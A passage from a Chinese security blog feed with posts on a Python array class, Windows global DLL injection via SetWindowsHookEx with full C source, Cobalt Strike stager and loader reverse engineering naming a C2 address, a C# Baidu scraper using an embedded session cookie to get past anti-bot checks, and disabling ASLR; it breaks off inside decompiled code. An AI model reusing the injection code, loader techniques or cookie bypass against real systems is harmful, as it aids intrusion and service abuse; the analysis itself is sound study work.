id="使用python实现数组"><a href="#使用python实现数组" class="headerlink" title="使用python实现数组"></a>使用python实现数组</h2><p>虽然自带的Array的模块能实现数组，但是还是跟着文章走了一手<br>参考链接:<a href="https://blog.csdn.net/Tonywu2018/article/details/88819424" target="_blank" rel="noopener">https://blog.csdn.net/Tonywu2018/article/details/88819424</a></p><pre><code class="python">class Array(object):    def __init__(self,capacity,fillvalue=None):        self.items=list()        for count in range(capacity):            self.items.append(fillvalue)    def editarray(self,index):        if index+1&gt;int(len(self.items)):            #当当前索引下位标识超过数组长度自动添加数组长度            temp=Array(index+1)            for p in range(0,len(self.items)):                temp.__setitem__(p,self.items[p])            self.items=temp            del temp            return True        else:            return False    def __len__(self):        #返回数组长度        return len(self.items)    def __str__(self):        #返回str类型的数组        return str(self.items)    def __iter__(self):        #返回遍历好的数组        return iter(self.items)    def __getitem__(self, index):        #通过索引获取数组中的值        return self.items[index]    def __setitem__(self, index, newItem):        #替换指定位置的值        self.editarray(index)        self.items[index]=newItem        return self.items    def __delitem__(self, key):        #删除数组指定下标        del self.items[key]        return self.items    def __add__(self, value):        #数据末尾添加        calc=0        for k in self.items:            if len(str(k))!=0:                calc+=1            else:                break        self.__setitem__(calc,value)if __name__ == &#39;__main__&#39;:    a=Array(6)    for i in range(7):        a[i]=i    a.__delitem__(-1)    for x in a.__iter__():        print(x,end=&#39;&#39;)    a.__setitem__(0,9)    print(a.__str__())    a.__add__(101)    print(a.__str__())</code></pre><p>最终结果<br><img src="https://s3.ax1x.com/2020/12/29/rbUH0K.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>全局注入研究</title>
      <link href="/posts/8bc59822.html"/>
      <url>/posts/8bc59822.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天和朋友聊的时候聊到全局注入，今天打算复现一下</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考链接:<a href="https://www.cnblogs.com/DarkBright/p/10835761.html" target="_blank" rel="noopener">https://www.cnblogs.com/DarkBright/p/10835761.html</a></p><h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>GetMsgProc<br>GetMsgProc与SetWindowsHookEx函数一起使用的应用程序定义或库定义的回调函数。每当GetMessage或PeekMessage函数从应用程序消息队列中检索消息时，系统就会调用此函数。在将检索到的消息返回给调用者之前，系统会将消息传递给挂钩过程。<br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)</a></p><p>SetWindowsHookExA<br>将应用程序定义的挂钩过程安装到挂钩链中。您将安装一个挂钩过程来监视系统中的某些类型的事件。这些事件与特定线程或与调用线程在同一桌面上的所有线程相关联。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa</a></p><p>UnhookWindowsHookEx<br>删除通过SetWindowsHookEx函数安装在挂钩链中的挂钩过程。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex</a></p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>整体思路：</p><pre><code>1. 声明钩子返回的函数即为GetMsgProc2. 设置钩子要钩住的的事件类型3. 定义要执行的函数4. DLLMain载入DLL的时候定义要执行的code5. 调用dll的LoadHook函数钩住6. 然后dll的HookLoad函数7. 由于载入DLL的时候会先执行DLLMain，所以当前进程会执行DLLMain然后在调用钩子钩住对应的类型，然后在注入dll8. 根据需求卸载钩子</code></pre><p>test.dll<br>导出的函数</p><pre><code>* LoadHook* UnloadHook</code></pre><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;HHOOK g_hook;HMODULE g_module;extern &quot;C&quot; {        __declspec(dllexport) BOOL LoadHook();}extern &quot;C&quot; {        __declspec(dllexport) VOID UnloadHook();}LRESULT CALLBACK GetMsgProc(        _In_ int    code,        _In_ WPARAM wParam,        _In_ LPARAM lParam) {        return CallNextHookEx(g_hook, code, wParam, lParam);}BOOL LoadHook(void) {        g_hook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_module, 0);        if (g_hook) {               MessageBoxA(NULL, &quot;Sucess&quot;, 0, MB_OK);               return TRUE;        }        else {               return FALSE;        }}VOID UnloadHook(void) {        if (g_hook) {               UnhookWindowsHookEx(g_hook);        }}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               g_module = hModule;               MessageBox(NULL, TEXT(&quot;加载DLL!&quot;), TEXT(&quot;提示&quot;), MB_OK);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p>inject.exe</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define DLL_NAME &quot;test.dll&quot;#define error(name){printf(&quot;Error:%s code:%d&quot;,name,GetLastError());}int main() {        do {               HMODULE hModule = LoadLibraryA(DLL_NAME);               if (hModule == NULL) {                       error(&quot;LoadLibraryA&quot;);                       break;               }               FARPROC pfnLoadHook = GetProcAddress(hModule,&quot;LoadHook&quot;);               FARPROC pfnUnLoadHook = GetProcAddress(hModule, &quot;UnloadHook&quot;);               if (pfnLoadHook == NULL || pfnUnLoadHook == NULL) {                       error(&quot;GetProcAddress&quot;);                       break;               }               if (pfnLoadHook()) {                       printf(&quot;global inject sucess!&quot;);               }else {                       printf(&quot;global inject failure&quot;);                       break;               }               printf(&quot;Enter UnloadHook&quot;);               getchar();               pfnUnLoadHook();        } while (FALSE);        getchar();        return 0;}</code></pre><p>在当前权限所允许的情况下，会多所有能访问的进程钩住注入dll<br><img src="https://s3.ax1x.com/2020/12/27/r56jvn.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/27/r5c32d.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cs 4.0马子分析模仿</title>
      <link href="/posts/b4f959ad.html"/>
      <url>/posts/b4f959ad.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在看文章的时候看到52pojie的一篇分析cs 4.0马子的文章。想跟着分析一下<br>由于技术不行，复现的并不完整。纯属记录</p><p>原文链接：<a href="https://www.52pojie.cn/thread-1334525-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1334525-1-1.html</a></p><h2 id="测试描述"><a href="#测试描述" class="headerlink" title="测试描述"></a>测试描述</h2><p>cs version:4.1<br>分段式exe</p><h2 id="分析工具"><a href="#分析工具" class="headerlink" title="分析工具"></a>分析工具</h2><p>IDA 7.5<br>x64dbg</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>Exeinfo查看对应的信息<br><img src="https://s3.ax1x.com/2020/12/26/r4EwPx.png" alt=""></p><p>无ASLR拖动到IDA分析,可寻找到入口点<br>(主要流程是执行两个函数然后开始循环sleep，默认是等待1秒)<br><img src="https://s3.ax1x.com/2020/12/26/r4VVW6.png" alt=""></p><p>根据原文章主要点在sub_401795，而sub_402A60尝试着去分析。后面并无得出啥结论<br>sub_401795<br><img src="https://s3.ax1x.com/2020/12/26/r4V5kR.png" alt=""></p><p>主要过程</p><ul><li>获取时间戳除以0x26AA</li><li>拼接得到pipe（管道）</li><li>创建进程执行sub_401685函数</li><li>返回sub_401742函数执行结果</li></ul><p>sub_401685函数<br><img src="https://s3.ax1x.com/2020/12/26/r4VztI.png" alt=""></p><p>继续跟踪里面的sub_4015D0</p><ul><li>创建管道</li><li>链接对应的管道</li><li>向管道写入shellcode</li><li>关闭管道<br><img src="https://s3.ax1x.com/2020/12/26/r4ZyEd.png" alt=""></li></ul><p>sub_401742函数</p><ul><li>malloc分配对应的内存空间</li><li>延时0x400秒</li><li>执行sub_4016A2函数</li><li>循环结束后执行sub_40152E函数<br><img src="https://s3.ax1x.com/2020/12/26/r4Z4KS.png" alt=""></li></ul><p>sub_4016A2函数</p><ul><li>创建管道</li><li>读取管道里的内容</li><li>关闭管道<br><img src="https://s3.ax1x.com/2020/12/26/r4epVJ.png" alt=""></li></ul><p>sub_40152E函数</p><ul><li>申请0x3000大小的内存空间</li><li>执行sub_4014F3函数判断是采用GetModuleHandleA还是GetProcAddress函数</li><li>执行VirtualProtect函数修改内存属性</li><li>CreateThread执行shellcode<br>sub_4014F3函数<br><img src="https://s3.ax1x.com/2020/12/26/r4eoQK.png" alt=""></li></ul><p><img src="https://s3.ax1x.com/2020/12/26/r4eKIA.png" alt=""></p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>x64dbg打开，用IDA查看入口点函数的地址。x64dbg跳转到对应的地址<br><img src="https://s3.ax1x.com/2020/12/26/r4mVWq.png" alt=""></p><p>对照IDA单步跟踪下去找到写入管道<br><img src="https://s3.ax1x.com/2020/12/26/r4m3k9.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/26/r4mmlV.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/26/r4mMmF.png" alt=""></p><p>读取管道并申请内存最后执行shellcode</p><ul><li>加载wininet.dll</li><li>再调用函数InternetOpen函数创建一个HINTERNET根句柄<br><img src="https://s3.ax1x.com/2020/12/26/r4m8YR.png" alt=""></li></ul><p>创建请求句柄，并把数据发送到服务器<br>随后解除数据向cs server发送请求<br><img src="https://s3.ax1x.com/2020/12/26/r4mN6K.png" alt=""></p><p>申请0x400000大小的内存，然后跳转执行到所申请的内存<br><img src="https://s3.ax1x.com/2020/12/26/r4mWnS.png" alt=""></p><p>然后原文那里解密出一个DLL并反射注入，并没模仿成功= =</p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>C#爬虫初探</title>
      <link href="/posts/ec93c081.html"/>
      <url>/posts/ec93c081.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近想学一下C#的winform。然后打算造个轮子搞搞</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>C#发起Http请求用的是<code>using System.Net</code>,利用WebRequest<br>Example</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Net;using System.IO;namespace ConsoleApplication47{    class Program    {        static void Main(string[] args)        {            string url = &quot;http://www.baidu.com/&quot;;            HttpWebRequest data = (HttpWebRequest)WebRequest.Create(url); //创建请求的URL            data.UserAgent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;; //设置UA头            data.Method = &quot;GET&quot;; //设置请求的方式            HttpWebResponse response = (HttpWebResponse)data.GetResponse(); //获取响应            Encoding enc = Encoding.GetEncoding(&quot;utf-8&quot;); //实例化一个编码            StreamReader sr = new StreamReader(response.GetResponseStream(), enc); //读取响应流并编码为UTF-8            var html = sr.ReadToEnd(); //从编码后的响应流完整读取            Console.WriteLine(html);            Console.ReadLine();        }    }}</code></pre><p>参考链接：<br><a href="https://blog.csdn.net/ksr12333/article/details/48845417" target="_blank" rel="noopener">https://blog.csdn.net/ksr12333/article/details/48845417</a><br><a href="https://crifan.github.io/crawl_your_data_spider_technology/website/how_write_spider/use_csharp/" target="_blank" rel="noopener">https://crifan.github.io/crawl_your_data_spider_technology/website/how_write_spider/use_csharp/</a></p><p>结果如下<br><img src="https://s3.ax1x.com/2020/12/26/rhudAJ.png" alt=""></p><p>这里拿baidu查询一个IP的归属地作为本次的目的<br><img src="https://s3.ax1x.com/2020/12/26/rhur1x.png" alt=""></p><p>这里查询的IP其实是baidu调用<code>ip138.com</code>的接口查询，如果你直接去爬ip138速度快的话一会就封IP了。<br>但是通过baidu去查则不会，虽然用多线程去请求baidu。快一点会出现baidu安全，其实带个cookie就能绕了</p><p>UI如下<br><img src="https://s3.ax1x.com/2020/12/26/rhuz3q.png" alt=""></p><p>这里值得注意的东西</p><ul><li>多线程处理UI的时候如何解决非原线程访问UI</li><li>UI的内容如何及时输出</li></ul><p>所以具体代码如下</p><pre><code class="C#">using System;using System.Collections.Generic;using System.ComponentModel;using System.Data;using System.Drawing;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Windows.Forms;using System.IO;using System.Net;using System.Text.RegularExpressions;using System.Threading;namespace WindowsFormsApplication5{    public partial class Form1 : Form    {   //     static ReaderWriterLockSlim LogWriteLock = new ReaderWriterLockSlim();        public Form1()        {           // Control.CheckForIllegalCrossThreadCalls=false;            InitializeComponent();        }        public void query(object tmp) {            string ip = tmp.ToString();            this.Invoke((EventHandler)delegate { this.label4.Text = &quot;IP正在查询:&quot; + ip; });            string url = &quot;http://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=&quot; + ip;            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);            req.Headers.Add(&quot;cookie&quot;, &quot;PSTM=1598200102; BAIDUID=73A08DA2B8A1C47748FE6E0263B2D7FC:FG=1; BIDUPSID=D1A9BC856D198D087B62FE6369A51D38; BD_UPN=12314753; sug=3; ORIGIN=2; bdime=0; sugstore=1; H_PS_PSSID=1453_33331_33306_31660_32973_33285_33287_33350_33313_33312_33311_33310_33309_33318_33308_33307_33239_33266_33389_33384; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; __yjs_duid=1_2bbdf988e437a50cf1e9527aeb11331f1608818232011; delPer=0; BD_CK_SAM=1; PSINO=6; COOKIE_SESSION=22_1_9_8_31_4_0_0_8_4_1_0_27_0_7_0_1608820717_1608280511_1608820710%7C9%23347061_47_1608280509%7C9; ZD_ENTRY=baidu; BD_HOME=1; BAIDUID_BFESS=F0D55FAB35899A68F91651F30B80AA72:FG=1; H_PS_645EC=7084MH7oreen2FkWL7qh5SKWiBZPRoo%2BRDJ4tyV3Dtv8JX%2BpHwi%2FAw83RfE; BA_HECTOR=8h000g848ka4akak7v1fu9k6f0q&quot;);            req.Method = &quot;GET&quot;;            try            {                HttpWebResponse response = (HttpWebResponse)req.GetResponse();                Encoding enc = Encoding.GetEncoding(&quot;utf-8&quot;);                StreamReader sr = new StreamReader(response.GetResponseStream(), enc);                string html = sr.ReadToEnd();                sr.Close();                Regex zz = new Regex(@&quot;IP地址:.*&quot;);                var ips = zz.Matches(html);                if (ips.Count &gt; 0)                {                    string data = ips[0].ToString().Replace(&quot;&amp;nbsp;&quot;, &quot;&quot;).Replace(&quot;&lt;/span&gt;&quot;, &quot;-&quot;);                    this.Invoke((EventHandler)delegate                    {                        result.Text += data.ToString() + &quot;\n&quot;;                        result.Refresh();                        result.SelectionStart = result.Text.Length;                        result.ScrollToCaret();                    });                }                else                {                    this.Invoke((EventHandler)delegate                    {                        result.Text += &quot;IP:&quot; + ip + &quot;查询失败\n&quot;;                        result.Refresh();                        result.SelectionStart = result.Text.Length;                        result.ScrollToCaret();                    });                }            }            catch {                this.Invoke((EventHandler)delegate                {                    result.Text += &quot;IP:&quot;+ip+&quot;请求失败\n&quot;;                    result.Refresh();                    result.SelectionStart = result.Text.Length;                    result.ScrollToCaret();                });            }        }        private void button2_Click(object sender, EventArgs e)        {            List&lt;string&gt; iplist = new List&lt;string&gt;();            string []data = richTextBox1.Text.Split(&#39;\n&#39;);            foreach (var ip in data)            {                Regex pd = new Regex(&quot;(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)&quot;);                if (pd.Match(ip).ToString() != &quot;&quot;)                {                    iplist.Add(ip);                }            }            label3.Text = &quot;合法IP数量:&quot; + iplist.Count;            label3.Refresh();            foreach (var ip2 in iplist) {                label4.Refresh();                Thread t=new Thread(new ParameterizedThreadStart(query));                t.Start(ip2);            }            label4.Text = &quot;查询完成&quot;;            label4.Refresh();        }        private void button1_Click(object sender, EventArgs e)        {            try            {                File.WriteAllText(&quot;save.txt&quot;, result.Text);                MessageBox.Show(&quot;保存文件成功&quot;);            }            catch {                MessageBox.Show(&quot;保存文件失败&quot;);            }        }    }}</code></pre><p>最后测试结果<br><img src="https://s3.ax1x.com/2020/12/26/rhKdr8.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Warring </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>开启和关闭ASLR</title>
      <link href="/posts/2a9e327.html"/>
      <url>/posts/2a9e327.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在分析样本的时候提到了ASLR，特地去了解了一下。记录一下</p><h2 id="ASLR的由来"><a href="#ASLR的由来" class="headerlink" title="ASLR的由来"></a>ASLR的由来</h2><p>微软从windows vista/windows server 2008（kernel version 6.0）开始采用ASLR技术，主要目的是为了防止缓冲区溢出<br>ASLR技术会使PE文件每次加载到内存的起始地址随机变化，并且进程的栈和堆的起始地址也会随机改变。<br>该技术需要操作系统和编译工具的双重支持（主要是操作系统的支持，编译工具主要作用是生成支持ASLR的PE格式）<br>若不想使用ASLR功能，可以在VS编译的时候将“配置属性-&gt;链接器-&gt;高级-&gt;随机基址”的值修改为否即可</p><h2 id="开启了ASLR和没开之间的区别"><a href="#开启了ASLR和没开之间的区别" class="headerlink" title="开启了ASLR和没开之间的区别"></a>开启了ASLR和没开之间的区别</h2><p>开启了ASLR的PE段多出一个.reloc，没开启ASLR没有.reloc这个段<br><img src="https://s3.ax1x.com/2020/12/19/rUkS9H.png" alt=""></p><p>IMAGE_FILE_HEADER\Characteristics<br>开启了ASLR的比没开启ASLR的少了一个IMAGE_FILE_RELOCS_STRRIPED<br>该字段的含义</p><p>重新定位信息被从文件中剥离。文件必须在它的首选基地址加载。如果基地址不可用，加载程序将报告错误。<br><code>https://msdn.microsoft.com/en-us/library/windows/desktop/ms680313(v = vs.85).aspx</code><br><img src="https://s3.ax1x.com/2020/12/19/rUktC4.png" alt=""></p><p>IMAGE_OPTIONAL_HEADER\DllCharacteristics<br>开启ASLR的程序比未开启的DllCharactersitics多了一个字段IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE，该字段值的含义<br><em>可以在加载时重新定位DLL</em><br><img src="https://s3.ax1x.com/2020/12/19/rUEWHP.png" alt=""></p><p>删除PE文件的ASLR功能<br>将IMAGE_OPTIONAL_HEADER\DllCharacteristic中的IMAGE_DLLCHARACTERISTICS_DYNAMIC字段值去掉即可：将PE中的十六进制第一个40 81数据改为00 81<br><img src="https://s3.ax1x.com/2020/12/19/rUViuR.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/19/rUVugH.png" alt=""></p><p>修改完在去看，发现IMAGE_DLLCHARACTERISTICS_DYNAMIC字段已经被删除<br><img src="https://s3.ax1x.com/2020/12/19/rUVlDI.png" alt=""></p><p>调试中的不同，无ASLR或关闭了ASLR是可以成功对应IDA的地址在OD中找到的<br><img src="https://s3.ax1x.com/2020/12/19/rUVJ58.png" alt=""></p><p>开启了ASLR后入口点和地址被随机化，无法定位<br><img src="https://s3.ax1x.com/2020/12/19/rUVtPS.png" alt=""></p><p>x64关闭ASLR<br>x64关闭PE的ASLR尝试寻找对应的十六进制发现找不到对应介绍的文章<br>后面发现可以用CFF Explore来关闭<br>64位<br><img src="https://s3.ax1x.com/2020/12/19/rUVcPU.png" alt=""></p><p>在编辑可选PE头的DllCharacteristics，点击Click here，将第一个复选框dll can move 去除勾选即可。改完以后Save<br><img src="https://s3.ax1x.com/2020/12/19/rUVqRe.png" alt=""></p><p>关闭ASLR后<br><img src="https://s3.ax1x.com/2020/12/19/rUVXMd.png" alt=""></p><p>关闭ASLR，从系统层面修改注册表；从PE文件中即修改相关字段值。<br>在调试程序的时候，因为地址随机化，每次调试地址都不一样，很是影响调试效果。关闭后文件总是加载到以400000为基址的地址范围内，代码的地址和IDA中也一直，所以大大方便分析。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/Kwansy/article/details/108292942" target="_blank" rel="noopener">修改PE可选头关闭ASLR</a><br><a href="https://www.jianshu.com/p/91b2b6665e64" target="_blank" rel="noopener">关闭地址随机化ASLR</a></p>]]></content>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>某远程加载马样本分析学习</title>
      <link href="/posts/8f916cea.html"/>
      <url>/posts/8f916cea.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在freebuf上看到一篇名为：<a href="https://www.freebuf.com/articles/web/257752.html" target="_blank" rel="noopener">一个CS马伪装下的loader样本分析</a><br>跟着复现了一下，由于底子不够分析的可能不全。</p><h2 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h2><p>Exeinfo<br>Detect Easy<br>IDA 7.5<br>API Monitor v2.0<br>Process Monitor<br>PEview<br>OD</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>根据文章给出的样本下载链接查看：<a href="https://app.any.run/tasks/ffc1ecff-e461-4474-8352-551db7e7b06f/" target="_blank" rel="noopener">https://app.any.run/tasks/ffc1ecff-e461-4474-8352-551db7e7b06f/</a><br>先在app.any.run看了一下分析结果<br><img src="https://s3.ax1x.com/2020/12/18/rJD9IS.png" alt=""></p><p>请求了两个URL,其中一个是二进制数据<br><a href="http://8.210.181.149:16678/9jhQ" target="_blank" rel="noopener">http://8.210.181.149:16678/9jhQ</a><br><img src="https://s3.ax1x.com/2020/12/18/rJDVrq.png" alt=""></p><p>目前得到的信息：<br>IP:8.210.181.149 - 归属地:香港<br>样本标记:Cobalt strike<br>执行方法疑似远程加载payload</p><p>微步社区查询该IP,已被标记<br><img src="https://s3.ax1x.com/2020/12/18/rJDceP.png" alt=""></p><p><a href="https://viz.greynoise.io/" target="_blank" rel="noopener">viz.greynoise.io</a>未标记cs<br><img src="https://s3.ax1x.com/2020/12/18/rJrKmt.png" alt=""></p><p>VT查杀<br><img src="https://s3.ax1x.com/2020/12/18/rJrM0P.png" alt=""></p><p>将样本下载到本地分析<br>md5 hash:3f37fc95aa5c8f7c304aa0dfc3ffbf2e<br>打开属性看到个数字签名<br><img src="https://s3.ax1x.com/2020/12/18/rJrJpQ.png" alt=""></p><p>Detect lt Easy拖进去查看，没有加壳，VC++写的<br><img src="https://s3.ax1x.com/2020/12/18/rJY95n.png" alt=""></p><p>查看导入的dll，就发现一个kernel.dll。windows API隐藏导入<br>该技术参考链接:<a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/" target="_blank" rel="noopener">https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/</a><br><img src="https://s3.ax1x.com/2020/12/18/rJ0d0K.png" alt=""></p><p>IDA静态分析<br>尝试搜索main函数，发现可以直接找到入口点（估计freebuf那篇文章作者用的是IDA 7.0没找到入口点）<br><img src="https://s3.ax1x.com/2020/12/18/rJsp9g.png" alt=""></p><p>跟到_main_0函数<br><img src="https://s3.ax1x.com/2020/12/18/rJr5tO.png" alt=""></p><p>首先跟踪__CheckForDebuggerJustMyCode<br><img src="https://s3.ax1x.com/2020/12/18/rJs3Hx.png" alt=""></p><p>dword_517944值看不到定义的是什么<br><img src="https://s3.ax1x.com/2020/12/18/rJsbPU.png" alt=""></p><p>往下面能看到调用了一堆API<br><img src="https://s3.ax1x.com/2020/12/18/rJygdx.png" alt=""></p><p>先不看这些API,继续分析_main_0。<code>_CheckForDebuggerJustMycode</code>后执行VirtualAlloc分配内存<br><img src="https://s3.ax1x.com/2020/12/18/rJyXY8.png" alt=""></p><p>之后调用_memmove函数，跟踪其unk_515000指针<br><img src="https://s3.ax1x.com/2020/12/18/rJ6KmR.png" alt=""></p><p>数组合并，hex转换回字符串<br><img src="https://s3.ax1x.com/2020/12/18/rJ6ccQ.png" alt=""></p><p>在解码后看到远程下载链接的路径9jhQ<br><img src="https://s3.ax1x.com/2020/12/18/rJ6f7q.png" alt=""></p><p>在payload尾部可以看见IP<br><img src="https://s3.ax1x.com/2020/12/18/rJ6XH1.png" alt=""></p><p>j__memmove函数分析，把VirtualAlloc分配内存的指针传入，把&amp;unk_515000指针传入该函数，传入大小799<br><img src="https://s3.ax1x.com/2020/12/18/rJgVsJ.png" alt=""></p><p>memmove函数为一个解码payload用的函数</p><pre><code class="c">void *__cdecl memmove(void *a1, const void *Src, size_t Size){  const __m128i *v3; // esi  size_t v4; // ecx  __m128i *v5; // edi  void *result; // eax  __int64 v7; // xmm1_8  __m128i v8; // xmm1  const __m128i *v9; // esi  __m128i v10; // xmm3  __m128i v11; // xmm0  __m128i v12; // xmm5  const __m128i *v13; // esi  __m128i v14; // xmm1  const __m128i *v15; // esi  __m128i v16; // xmm3  __m128i v17; // xmm0  __m128i v18; // xmm5  __m128i v19; // xmm1  const __m128i *v20; // esi  __m128i v21; // xmm3  __m128i v22; // xmm0  __m128i v23; // xmm5  __m128i v24; // xmm1  __int32 v25; // eax  __int64 v26; // xmm1_8  char v27; // dl  size_t v28; // ecx  const __m128i *v29; // esi  __m128i *v30; // edi  int v31; // edx  char v32; // dl  size_t v33; // ecx  int v34; // edx  __int8 *v35; // esi  char *v36; // edi  __m128i v37; // xmm1  __m128i v38; // xmm2  __m128i v39; // xmm3  __m128i v40; // xmm4  __m128i v41; // xmm5  __m128i v42; // xmm6  __m128i v43; // xmm7  __m128i v44; // xmm1  int v45; // eax  size_t v46; // edx  size_t j; // edx  __m128i v48; // xmm1  __m128i v49; // xmm2  __m128i v50; // xmm3  __m128i v51; // xmm5  __m128i v52; // xmm6  __m128i v53; // xmm7  size_t k; // edx  __m128i v55; // xmm1  unsigned int v56; // ecx  char v57; // al  unsigned int l; // ecx  int v59; // ecx  unsigned int v60; // eax  int v61; // ecx  unsigned int i; // eax  size_t v63; // [esp-4h] [ebp-Ch]  v3 = (const __m128i *)Src;  v4 = Size;  v5 = (__m128i *)a1;  if ( a1 &gt; Src &amp;&amp; a1 &lt; (char *)Src + Size )  {    v29 = (const __m128i *)((char *)Src + Size);    v30 = (__m128i *)((char *)a1 + Size);    if ( Size &gt;= 0x20 )    {      if ( _bittest(&amp;dword_5153EC, 1u) )      {        for ( ; ((unsigned __int8)v30 &amp; 0xF) != 0; v30-&gt;m128i_i8[0] = v29-&gt;m128i_i8[0] )        {          --v4;          v29 = (const __m128i *)((char *)v29 - 1);          v30 = (__m128i *)((char *)v30 - 1);        }        do        {          if ( v4 &lt; 0x80 )            break;          v29 -= 8;          v30 -= 8;          v37 = _mm_loadu_si128(v29 + 1);          v38 = _mm_loadu_si128(v29 + 2);          v39 = _mm_loadu_si128(v29 + 3);          v40 = _mm_loadu_si128(v29 + 4);          v41 = _mm_loadu_si128(v29 + 5);          v42 = _mm_loadu_si128(v29 + 6);          v43 = _mm_loadu_si128(v29 + 7);          *v30 = _mm_loadu_si128(v29);          v30[1] = v37;          v30[2] = v38;          v30[3] = v39;          v30[4] = v40;          v30[5] = v41;          v30[6] = v42;          v30[7] = v43;          v4 -= 128;        }        while ( (v4 &amp; 0xFFFFFF80) != 0 );        if ( v4 &gt;= 0x20 )        {          do          {            v29 -= 2;            v30 -= 2;            v44 = _mm_loadu_si128(v29 + 1);            *v30 = _mm_loadu_si128(v29);            v30[1] = v44;            v4 -= 32;          }          while ( (v4 &amp; 0xFFFFFFE0) != 0 );        }      }      else      {        if ( ((unsigned __int8)v30 &amp; 3) != 0 )        {          v31 = (unsigned __int8)v30 &amp; 3;          v4 = Size - v31;          do          {            v30[-1].m128i_i8[15] = v29[-1].m128i_i8[15];            v29 = (const __m128i *)((char *)v29 - 1);            v30 = (__m128i *)((char *)v30 - 1);            --v31;          }          while ( v31 );        }        if ( v4 &gt;= 0x20 )        {          v32 = v4;          v33 = v4 &gt;&gt; 2;          v34 = v32 &amp; 3;          v35 = &amp;v29[-1].m128i_i8[12];          v36 = &amp;v30[-1].m128i_i8[12];          while ( v33 )          {            *(_DWORD *)v36 = *(_DWORD *)v35;            v35 -= 4;            v36 -= 4;            --v33;          }          switch ( v34 )          {            case 0:              result = a1;              break;            case 1:              v36[3] = v35[3];              result = a1;              break;            case 2:              v36[3] = v35[3];              v36[2] = v35[2];              result = a1;              break;            case 3:              v36[3] = v35[3];              v36[2] = v35[2];              v36[1] = v35[1];              result = a1;              break;          }          return result;        }      }    }    for ( ; (v4 &amp; 0xFFFFFFFC) != 0; v4 -= 4 )    {      v30 = (__m128i *)((char *)v30 - 4);      v29 = (const __m128i *)((char *)v29 - 4);      v30-&gt;m128i_i32[0] = v29-&gt;m128i_i32[0];    }    for ( ; v4; --v4 )    {      v30 = (__m128i *)((char *)v30 - 1);      v29 = (const __m128i *)((char *)v29 - 1);      v30-&gt;m128i_i8[0] = v29-&gt;m128i_i8[0];    